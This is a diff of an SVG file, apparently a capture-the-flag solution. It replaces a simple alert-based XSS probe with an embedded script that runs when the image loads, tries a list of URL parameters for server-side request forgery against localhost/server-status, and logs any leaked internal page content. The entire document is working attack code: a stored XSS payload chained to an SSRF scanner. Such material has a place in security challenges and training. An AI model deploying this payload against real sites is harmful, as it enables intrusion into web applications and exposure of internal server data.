@@ -1,1 +1,44 @@
-<svg onload="alert(document.domain)"></svg>
+<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+<script>
+    (async function() {
+        console.log('[+] SVG XSS Successful! Starting SSRF probe...');
+ 
+        const ssrfParams = ['url', 'uri', 'page', 'site', 'dest', 'redirect', 'host', 'view'];
+        const internalUrl = 'http://localhost/server-status';
+        const successKeyword = 'Apache Server Status';
+ 
+        async function testParam(param) {
+            // We construct the URL to test, e.g., http://challenge.com/?url=http://localhost/server-status
+            const probeUrl = `${window.location.origin}/?${param}=${encodeURIComponent(internalUrl)}`;
+            console.log(`[+] Testing URL: ${probeUrl}`);
+ 
+            try {
+                // The script inside the SVG makes the request. Since it's loaded from the same origin, this is allowed.
+                const response = await fetch(probeUrl);
+                const responseText = await response.text();
+ 
+                // Check if the response contains our keyword
+                if (responseText.includes(successKeyword)) {
+                    console.log(`%c[SUCCESS] Found vulnerable parameter: '${param}'`, 'color: green; font-size: 20px;');
+                    console.log('[SUCCESS] Leaked page content below:');
+                    console.log(responseText);
+                    // Since scripts in <img> tags can't modify the main page,
+                    // logging to the console is the best way to see the result.
+                    // The flag will be in the responseText.
+                    return true;
+                } else {
+                    console.log(`[-] Parameter '${param}' did not work.`);
+                }
+            } catch (error) {
+                console.error(`[-] Error testing parameter '${param}':`, error);
+            }
+            return false;
+        }
+ 
+        for (const param of ssrfParams) {
+            const found = await testParam(param);
+            if (found) break;
+        }
+    })();
+</script>
+</svg>
